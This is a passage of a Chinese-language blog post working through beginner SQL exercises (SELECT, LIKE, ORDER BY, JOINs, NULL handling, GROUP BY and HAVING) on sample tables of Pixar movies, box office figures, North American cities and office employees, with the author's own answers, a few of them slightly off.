class="hljs-keyword">year</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">between</span> <span class="hljs-number">2000</span> <span class="hljs-keyword">and</span> <span class="hljs-number">2010</span></code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> &lt;=<span class="hljs-number">5</span></code></pre></div><p>5.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">where</span> <span class="hljs-keyword">year</span> &gt;=<span class="hljs-number">2010</span> <span class="hljs-keyword">and</span> length_minutes &lt;<span class="hljs-number">120</span></code></pre></div><h3 id="Lesson-3-条件查询-constraints-Pt-2"><a href="#Lesson-3-条件查询-constraints-Pt-2" class="headerlink" title="Lesson 3: 条件查询(constraints) (Pt. 2)"></a><strong>Lesson 3: 条件查询(constraints) (Pt. 2)</strong></h3><p>表格与<strong>Lesson0</strong>相同</p><p>练习 do it — 请完成如下任务</p><ol><li><p>【复杂条件】找到所有<code>Toy Story</code>系列电影</p></li><li><p>【复杂条件】找到所有<code>John Lasseter</code>导演的电影</p></li><li><p>【复杂条件】找到所有不是<code>John Lasseter</code>导演的电影</p></li><li><p>【复杂条件】找到所有电影名为<code>"WALL-"</code>开头的电影</p></li><li><p>【复杂条件】有一部98年电影中文名《虫虫危机》请给我找出来</p><p>1.</p></li></ol><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> movies <span class="hljs-keyword">where</span> title = <span class="hljs-string">'Toy Story'</span> <span class="hljs-keyword">or</span> title <span class="hljs-keyword">like</span> <span class="hljs-string">'Toy Story %'</span></code></pre></div><p>字符串用<kbd>' '</kbd>表示，字符串区分大小写</p><p>like(模糊查询)， %（通配符） </p><p>当使用通配符时，需要用like；当没有用通配符时，like没有用通配符等价于=，not like等价于!=</p><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> movies <span class="hljs-keyword">where</span> Director = <span class="hljs-string">'John Lasseter'</span></code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> movies <span class="hljs-keyword">where</span> Director != <span class="hljs-string">'John Lasseter'</span></code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> movies <span class="hljs-keyword">where</span> title <span class="hljs-keyword">like</span> <span class="hljs-string">'WALL-%'</span></code></pre></div><p>5.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> movies <span class="hljs-keyword">where</span> <span class="hljs-keyword">year</span> = <span class="hljs-number">1998</span></code></pre></div><h3 id="Lesson-4-查询结果Filtering过滤-和-sorting排序"><a href="#Lesson-4-查询结果Filtering过滤-和-sorting排序" class="headerlink" title="Lesson 4: 查询结果Filtering过滤 和 sorting排序"></a><strong>Lesson 4: 查询结果Filtering过滤 和 sorting排序</strong></h3><p>表格与<strong>Lesson0</strong>相同</p><p>练习 do it — 请完成如下任务</p><ol><li>【结果排序】按导演名<code>排重</code>列出所有电影(只显示导演)，并按导演名正序排列</li><li>【结果排序】列出按上映年份<code>最新</code>上线的4部电影</li><li>【结果排序】按电影名字母序<code>升序</code>排列，列出前5部电影</li><li>【结果排序】按电影名字母序升序排列，列出上一题<code>之后</code>的5部电影</li><li>【结果排序】如果按片长排列，John Lasseter导演导过片长第3长的电影是哪部，列出名字即可</li></ol><p>1.</p><p> <strong>DISTINCT</strong> 去重</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> director <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> director <span class="hljs-keyword">asc</span></code></pre></div><p>2.</p><p> 通过 <code>OFFSET</code> 指定从哪里开始剪，用 <code>LIMIT</code> 指定剪下多少长度 </p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">year</span> <span class="hljs-keyword">desc</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">4</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">year</span> <span class="hljs-keyword">desc</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">4</span></code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> title <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span></code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> title <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">5</span></code></pre></div><p>5.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> title <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">where</span> director = <span class="hljs-string">'John Lasseter'</span><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> length_minutes <span class="hljs-keyword">desc</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span></code></pre></div><h3 id="Lesson-5（Review）-复习-SELECT-查询"><a href="#Lesson-5（Review）-复习-SELECT-查询" class="headerlink" title="Lesson 5（Review） 复习 SELECT 查询"></a><strong>Lesson 5（Review） 复习 SELECT 查询</strong></h3><p>Table(表）: North_american_cities</p><table><thead><tr><th>City</th><th>Country</th><th>Population</th><th>Latitude</th><th>Longitude</th></tr></thead><tbody><tr><td>Guadalajara</td><td>Mexico</td><td>1500800</td><td>20.659699</td><td>-103.349609</td></tr><tr><td>Toronto</td><td>Canada</td><td>2795060</td><td>43.653226</td><td>-79.383184</td></tr><tr><td>Houston</td><td>United States</td><td>2195914</td><td>29.760427</td><td>-95.369803</td></tr><tr><td>New York</td><td>United States</td><td>8405837</td><td>40.712784</td><td>-74.005941</td></tr><tr><td>Philadelphia</td><td>United States</td><td>1553165</td><td>39.952584</td><td>-75.165222</td></tr><tr><td>Havana</td><td>Cuba</td><td>2106146</td><td>23.05407</td><td>-82.345189</td></tr><tr><td>Mexico City</td><td>Mexico</td><td>8555500</td><td>19.432608</td><td>-99.133208</td></tr><tr><td>Phoenix</td><td>United States</td><td>1513367</td><td>33.448377</td><td>-112.074037</td></tr><tr><td>Los Angeles</td><td>United States</td><td>3884307</td><td>34.052234</td><td>-118.243685</td></tr><tr><td>Ecatepec de Morelos</td><td>Mexico</td><td>1742000</td><td>19.601841</td><td>-99.050674</td></tr><tr><td>Montreal</td><td>Canada</td><td>1717767</td><td>45.501689</td><td>-73.567256</td></tr><tr><td>Chicago</td><td>United States</td><td>2718782</td><td>41.878114</td><td>-87.629798</td></tr></tbody></table><p>练习 do it — 请完成如下任务</p><ol><li>【复习】列出所有加拿大人的<code>Canadian</code>信息(包括所有字段)</li><li>【复习】列出所有在<code>Chicago</code>西部的城市，从西到东排序(包括所有字段)</li><li>【复习】用人口数<code>population</code>排序,列出墨西哥<code>Mexico</code>最大的2个城市(包括所有字段)</li><li>【复习】列出美国<code>United States</code>人口3-4位的两个城市和他们的人口(包括所有字段)</li></ol><p>1.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> North_american_cities <span class="hljs-keyword">where</span> country=<span class="hljs-string">'Canada'</span></code></pre></div><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> North_american_cities <span class="hljs-keyword">where</span> longitude &lt; <span class="hljs-number">-87.629798</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> longitude</code></pre></div><p>（此处需改进）</p><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> North_american_cities <span class="hljs-keyword">where</span> country = <span class="hljs-string">'Mexico'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> population <span class="hljs-keyword">desc</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">2</span></code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> North_american_cities <span class="hljs-keyword">where</span> country = <span class="hljs-string">'United States'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> population <span class="hljs-keyword">desc</span>  <span class="hljs-keyword">limit</span> <span class="hljs-number">2</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">2</span></code></pre></div><h3 id="Lesson-6-用JOINs进行多表联合查询"><a href="#Lesson-6-用JOINs进行多表联合查询" class="headerlink" title="Lesson 6: 用JOINs进行多表联合查询"></a><strong>Lesson 6: 用JOINs进行多表联合查询</strong></h3><p>在<strong>Lesson0</strong>的Movies表基础上增加另外一个表：</p><p>Table: Boxoffice (Read-Only)</p><table><thead><tr><th>Movie_id</th><th>Rating</th><th>Domestic_sales</th><th>International_sales</th></tr></thead><tbody><tr><td>5</td><td>8.2</td><td>380843261</td><td>555900000</td></tr><tr><td>14</td><td>7.4</td><td>268492764</td><td>475066843</td></tr><tr><td>8</td><td>8</td><td>206445654</td><td>417277164</td></tr><tr><td>12</td><td>6.4</td><td>191452396</td><td>368400000</td></tr><tr><td>3</td><td>7.9</td><td>245852179</td><td>239163000</td></tr><tr><td>6</td><td>8</td><td>261441092</td><td>370001000</td></tr><tr><td>9</td><td>8.5</td><td>223808164</td><td>297503696</td></tr><tr><td>11</td><td>8.4</td><td>415004880</td><td>648167031</td></tr><tr><td>1</td><td>8.3</td><td>191796233</td><td>170162503</td></tr><tr><td>7</td><td>7.2</td><td>244082982</td><td>217900167</td></tr><tr><td>10</td><td>8.3</td><td>293004164</td><td>438338580</td></tr><tr><td>4</td><td>8.1</td><td>289916256</td><td>272900000</td></tr><tr><td>2</td><td>7.2</td><td>162798565</td><td>200600000</td></tr><tr><td>13</td><td>7.2</td><td>237283207</td><td>301700000</td></tr></tbody></table><p>练习 do it — 请完成如下任务</p><ol><li>【联表】找到所有电影的国内<code>Domestic_sales</code>和国际销售额</li><li>【联表】找到所有国际销售额比国内销售大的电影</li><li>【联表】找出所有电影按市场占有率<code>rating</code>倒序排列</li><li>【联表】每部电影按国际销售额比较,排名最靠前的导演是谁,国际销量多少</li></ol><p>1.</p><p> <code>INNER JOIN</code> 可以简写做 <code>JOIN</code> </p><p>（<kbd>INNER</kbd>必须大写）</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">join</span> boxoffice <span class="hljs-keyword">on</span> movies.id = boxoffice.movie_id</code></pre></div><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">join</span> boxoffice <span class="hljs-keyword">on</span> movies.id = boxoffice.movie_id<span class="hljs-keyword">where</span> domestic_sales&lt;international_sales</code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">join</span> boxoffice <span class="hljs-keyword">on</span> movies.id = boxoffice.movie_id<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> rating</code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> director,international_sales <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">join</span> boxoffice <span class="hljs-keyword">on</span> movies.id = boxoffice.movie_id<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> international_sales <span class="hljs-keyword">desc</span><span class="hljs-keyword">limit</span> <span class="hljs-number">1</span></code></pre></div><h3 id="Lesson-7-外连接（OUTER-JOINs）"><a href="#Lesson-7-外连接（OUTER-JOINs）" class="headerlink" title="Lesson 7: 外连接（OUTER JOINs）"></a><strong>Lesson 7: 外连接（OUTER JOINs）</strong></h3><p>Table: Employees</p><table><thead><tr><th>Role</th><th>Name</th><th>Building</th><th>Years_employed</th></tr></thead><tbody><tr><td>Engineer</td><td>Becky A.</td><td>1e</td><td>4</td></tr><tr><td>Engineer</td><td>Dan B.</td><td>1e</td><td>2</td></tr><tr><td>Engineer</td><td>Sharon F.</td><td>1e</td><td>6</td></tr><tr><td>Engineer</td><td>Dan M.</td><td>1e</td><td>4</td></tr><tr><td>Engineer</td><td>Malcom S.</td><td>1e</td><td>1</td></tr><tr><td>Artist</td><td>Tylar S.</td><td>2w</td><td>2</td></tr><tr><td>Artist</td><td>Sherman D.</td><td>2w</td><td>8</td></tr><tr><td>Artist</td><td>Jakob J.</td><td>2w</td><td>6</td></tr><tr><td>Artist</td><td>Lillia A.</td><td>2w</td><td>7</td></tr><tr><td>Artist</td><td>Brandon J.</td><td>2w</td><td>7</td></tr><tr><td>Manager</td><td>Scott K.</td><td>1e</td><td>9</td></tr><tr><td>Manager</td><td>Shirlee M.</td><td>1e</td><td>3</td></tr><tr><td>Manager</td><td>Daria O.</td><td>2w</td><td>6</td></tr><tr><td>Engineer</td><td>Yancy I.</td><td>null</td><td>0</td></tr><tr><td>Artist</td><td>Oliver P.</td><td>null</td><td>0</td></tr></tbody></table><p>Table: Buildings</p><table><thead><tr><th>Building_name</th><th>Capacity</th></tr></thead><tbody><tr><td>1e</td><td>24</td></tr><tr><td>1w</td><td>32</td></tr><tr><td>2e</td><td>16</td></tr><tr><td>2w</td><td>20</td></tr></tbody></table><p>练习 do it — 请完成如下任务</p><ol><li>【复习】找到所有有雇员的办公室(<code>buildings</code>)名字</li><li>【复习】找到所有办公室里的所有角色（包含没有雇员的）,并做唯一输出(<code>DISTINCT</code>)</li><li>【难题】找到所有有雇员的办公室(<code>buildings</code>)和对应的容量</li></ol><p>1.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> building <span class="hljs-keyword">from</span> employees <span class="hljs-keyword">where</span> building <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span></code></pre></div><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> Building_name, <span class="hljs-keyword">Role</span> <span class="hljs-keyword">from</span> Buildings<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> Employees  <span class="hljs-keyword">on</span>  Buildings.Building_name = Employees.Building</code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> Building_name,<span class="hljs-keyword">Capacity</span> <span class="hljs-keyword">from</span> Employees<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> Buildings <span class="hljs-keyword">on</span>  Buildings.Building_name = Employees.Building<span class="hljs-keyword">where</span> Building_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">null</span></code></pre></div><h3 id="Lesson-8-关于特殊关键字-NULLs"><a href="#Lesson-8-关于特殊关键字-NULLs" class="headerlink" title="Lesson 8: 关于特殊关键字 NULLs"></a><strong>Lesson 8: 关于特殊关键字 NULLs</strong></h3><p>表格与<strong>Lesson7</strong>相同</p><p>练习 do it — 请完成如下任务</p><ol><li>【复习】找到雇员里还没有分配办公室的(列出名字和角色就可以)</li><li>【难题】找到还没有雇员的办公室</li></ol><p>1.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">Role</span>,<span class="hljs-keyword">Name</span> <span class="hljs-keyword">from</span> Employees<span class="hljs-keyword">where</span> Building <span class="hljs-keyword">is</span> <span class="hljs-literal">null</span></code></pre></div><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> Building_name <span class="hljs-keyword">from</span> Buildings<span class="hljs-keyword">where</span> Building_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>(<span class="hljs-keyword">select</span>Building <span class="hljs-keyword">from</span> Employees <span class="hljs-keyword">where</span> building <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span>)</code></pre></div><h3 id="Lesson-9-在查询中使用表达式"><a href="#Lesson-9-在查询中使用表达式" class="headerlink" title="Lesson 9: 在查询中使用表达式"></a><strong>Lesson 9: 在查询中使用表达式</strong></h3><p>Table: Movies (Read-Only)</p><table><thead><tr><th>Id</th><th>Title</th><th>Director</th><th>Year</th><th>Length_minutes</th></tr></thead><tbody><tr><td>1</td><td>Toy Story</td><td>John Lasseter</td><td>1995</td><td>81</td></tr><tr><td>2</td><td>A Bug’s Life</td><td>John Lasseter</td><td>1998</td><td>95</td></tr><tr><td>3</td><td>Toy Story 2</td><td>John Lasseter</td><td>1999</td><td>93</td></tr><tr><td>4</td><td>Monsters, Inc.</td><td>Pete Docter</td><td>2001</td><td>92</td></tr><tr><td>5</td><td>Finding Nemo</td><td>Finding Nemo</td><td>2003</td><td>107</td></tr><tr><td>6</td><td>The Incredibles</td><td>Brad Bird</td><td>2004</td><td>116</td></tr><tr><td>7</td><td>Cars</td><td>John Lasseter</td><td>2006</td><td>117</td></tr><tr><td>8</td><td>Ratatouille</td><td>Brad Bird</td><td>2007</td><td>115</td></tr><tr><td>9</td><td>WALL-E</td><td>Andrew Stanton</td><td>2008</td><td>104</td></tr><tr><td>10</td><td>Up</td><td>Pete Docter</td><td>2009</td><td>101</td></tr><tr><td>11</td><td>Toy Story 3</td><td>Lee Unkrich</td><td>2010</td><td>103</td></tr><tr><td>12</td><td>Cars 2</td><td>John Lasseter</td><td>2011</td><td>120</td></tr><tr><td>13</td><td>Brave</td><td>Brenda Chapman</td><td>2012</td><td>102</td></tr><tr><td>14</td><td>Monsters University</td><td>Dan Scanlon</td><td>2013</td><td>110</td></tr></tbody></table><p>Table: Boxoffice (Read-Only)</p><table><thead><tr><th>Movie_id</th><th>Rating</th><th>Domestic_sales</th><th>International_sales</th></tr></thead><tbody><tr><td>5</td><td>8.2</td><td>380843261</td><td>555900000</td></tr><tr><td>14</td><td>7.4</td><td>268492764</td><td>475066843</td></tr><tr><td>8</td><td>8</td><td>206445654</td><td>417277164</td></tr><tr><td>12</td><td>6.4</td><td>191452396</td><td>368400000</td></tr><tr><td>3</td><td>7.9</td><td>245852179</td><td>239163000</td></tr><tr><td>6</td><td>8</td><td>261441092</td><td>370001000</td></tr><tr><td>9</td><td>8.5</td><td>223808164</td><td>297503696</td></tr><tr><td>11</td><td>8.4</td><td>415004880</td><td>648167031</td></tr><tr><td>1</td><td>8.3</td><td>191796233</td><td>170162503</td></tr><tr><td>7</td><td>7.2</td><td>244082982</td><td>217900167</td></tr><tr><td>10</td><td>8.3</td><td>293004164</td><td>438338580</td></tr><tr><td>4</td><td>8.1</td><td>289916256</td><td>272900000</td></tr><tr><td>2</td><td>7.2</td><td>162798565</td><td>200600000</td></tr><tr><td>13</td><td>7.2</td><td>237283207</td><td>301700000</td></tr></tbody></table><p>练习 do it — 请完成如下任务</p><ol><li>【计算】列出所有的电影ID,名字和销售总额(以百万美元为单位计算) ✓</li><li>【计算】列出所有的电影ID,名字和市场指数(<code>Rating</code>的10倍为市场指数)</li><li>【计算】列出所有偶数年份的电影，需要电影ID,名字和年份</li><li>【难题】John Lasseter导演的每部电影每分钟值多少钱,告诉我最高的3个电影名和价值就可以</li></ol><p>1.</p><p>as 命名别名</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">Id</span>,Title,(International_sales+Domestic_sales)/<span class="hljs-number">1000000</span> <span class="hljs-keyword">from</span> Movies<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> Boxoffice <span class="hljs-keyword">on</span> Movies.Id = Boxoffice.Movie_id<span class="hljs-keyword">select</span> <span class="hljs-keyword">Id</span>,Title,(International_sales+Domestic_sales)/<span class="hljs-number">1000000</span> <span class="hljs-keyword">as</span> sales <span class="hljs-keyword">from</span> Movies<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> Boxoffice <span class="hljs-keyword">on</span> Movies.Id = Boxoffice.Movie_id</code></pre></div><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">Id</span>,Title,<span class="hljs-number">10</span>*Rating <span class="hljs-keyword">from</span> Movies<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> Boxoffice <span class="hljs-keyword">on</span> Movies.Id = Boxoffice.Movie_id</code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">Id</span>,Title,<span class="hljs-keyword">Year</span> <span class="hljs-keyword">from</span> Movies<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> Boxoffice <span class="hljs-keyword">on</span> Movies.Id = Boxoffice.Movie_id<span class="hljs-keyword">where</span> Movies.Year%<span class="hljs-number">2</span> == <span class="hljs-number">0</span></code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> Title,(International_sales+Domestic_sales)/Length_minutes <span class="hljs-keyword">from</span> Movies<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> Boxoffice <span class="hljs-keyword">on</span> Movies.Id = Boxoffice.Movie_id<span class="hljs-keyword">where</span> Director = <span class="hljs-string">'John Lasseter'</span><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> (International_sales+Domestic_sales)/Length_minutes <span class="hljs-keyword">desc</span><span class="hljs-keyword">limit</span> <span class="hljs-number">3</span></code></pre></div><h3 id="Lesson-10-在查询中进行统计I-Pt-1"><a href="#Lesson-10-在查询中进行统计I-Pt-1" class="headerlink" title="Lesson 10: 在查询中进行统计I (Pt. 1)"></a><strong>Lesson 10: 在查询中进行统计I (Pt. 1)</strong></h3><p>表格为<strong>Lesson7</strong>的Employees</p><p>练习 do it — 请完成如下任务</p><ol><li>【统计】找出就职年份最高的雇员(列出雇员名字+年份） ✓</li><li>【分组】按角色(<code>Role</code>)统计一下每个角色的平均就职年份</li><li>【分组】按办公室名字总计一下就职年份总和</li><li>【难题】每栋办公室按人数排名,不要统计无办公室的雇员</li></ol><p>1.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">Name</span>,Years_employed <span class="hljs-keyword">from</span> Employees<span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> Years_employed <span class="hljs-keyword">desc</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span></code></pre></div><p>2.</p><p> <code>GROUP BY ...</code>，全部数据里有几条，就返回几条数据， 不管是否应用了统计函数. </p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">role</span>,<span class="hljs-keyword">avg</span>(Years_employed) <span class="hljs-keyword">from</span> Employees<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">role</span></code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> Building,<span class="hljs-keyword">sum</span>(Years_employed) <span class="hljs-keyword">from</span> Employees<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> Building</code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> Building,<span class="hljs-keyword">count</span>(<span class="hljs-keyword">Name</span>) <span class="hljs-keyword">from</span> Employees<span class="hljs-keyword">where</span> Building <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> Building</code></pre></div><h3 id="Lesson-11-在查询中进行统计II-Pt-2"><a href="#Lesson-11-在查询中进行统计II-Pt-2" class="headerlink" title="Lesson 11: 在查询中进行统计II (Pt. 2)"></a><strong>Lesson 11: 在查询中进行统计II (Pt. 2)</strong></h3><p> 在 <code>GROUP BY</code> 分组语法中，我们知道数据库是先对数据做<code>WHERE</code>，然后对结果做分组，如果我们要对分组完的数据再筛选出几条的操作：</p><p>  <code>HAVING</code>  可以对分组之后的数据再做SELECT筛选 。</p><p>1.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(<span class="hljs-keyword">Role</span>) <span class="hljs-keyword">from</span> Employees<span class="hljs-keyword">where</span> <span class="hljs-keyword">Role</span> = <span class="hljs-string">'Artist'</span></code></pre></div><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">Role</span>,<span class="hljs-keyword">count</span>(<span class="hljs-keyword">Role</span>) <span class="hljs-keyword">from</span> Employees<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">Role</span></code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">sum</span>(Years_employed) <span class="hljs-keyword">from</span> Employees<span class="hljs-keyword">where</span> <span class="hljs-keyword">Role</span> = <span class="hljs-string">'Engineer'</span></code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(),<span class="hljs-keyword">role</span>,<span class="hljs-string">'1'</span> <span class="hljs-keyword">from</span> Employees <span class="hljs-keyword">where</span> Building <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">role</span><span class="hljs-keyword">union</span><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(),<span class="hljs-keyword">role</span>,<span class="hljs-string">'0'</span> <span class="hljs-keyword">from</span> Employees <span class="hljs-keyword">where</span> Building <span class="hljs-keyword">is</span> <span class="hljs-literal">null</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">role</span></code></pre></div><h3 id="Lesson-12-查询执行顺序"><a href="#Lesson-12-查询执行顺序" class="headerlink" title="Lesson 12: 查询执行顺序"></a><strong>Lesson 12: 查询执行顺序</strong></h3><p>表格与<strong>Lesson 6</strong>相同</p><p>1.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> Director,<span class="hljs-keyword">count</span>() <span class="hljs-keyword">from</span> Movies<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> Director</code></pre></div><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> Director,<span class="hljs-keyword">sum</span>(Domestic_sales+International_sales) <span class="hljs-keyword">as</span> sales <span class="hljs-keyword">from</span> Movies<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> Boxoffice <span class="hljs-keyword">on</span> movies.id = boxoffice.Movie_id<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> Director</code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">sum</span>(Domestic_sales+International_sales) <span class="hljs-keyword">as</span> sales,Director,<span class="hljs-keyword">count</span>(Title),<span class="hljs-keyword">sum</span>(Domestic_sales+International_sales)/<span class="hljs-keyword">count</span>(Title) <span class="hljs-keyword">from</span> Movies<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> Boxoffice <span class="hljs-keyword">on</span> movies.id = boxoffice.Movie_id<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> Director<span class="hljs-keyword">having</span> <span class="hljs-keyword">count</span>(Title) != <span class="hljs-number">1</span><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">sum</span>(Domestic_sales+International_sales)/<span class="hljs-keyword">count</span>(Title) <span class="hljs-keyword">desc</span><span class="hljs-keyword">limit</span> <span class="hljs-number">1</span></code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">max</span>(Domestic_sales+International_sales) <span class="hljs-keyword">from</span> Movies<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> Boxoffice <span class="hljs-keyword">on</span> movies.id = boxoffice.Movie_id)-(Domestic_sales+International_sales),Title <span class="hljs-keyword">from</span> Movies<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> Boxoffice <span class="hljs-keyword">on</span> movies.id = boxoffice.Movie_id</code></pre></div><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="http://xuesql.cn/" target="_blank" 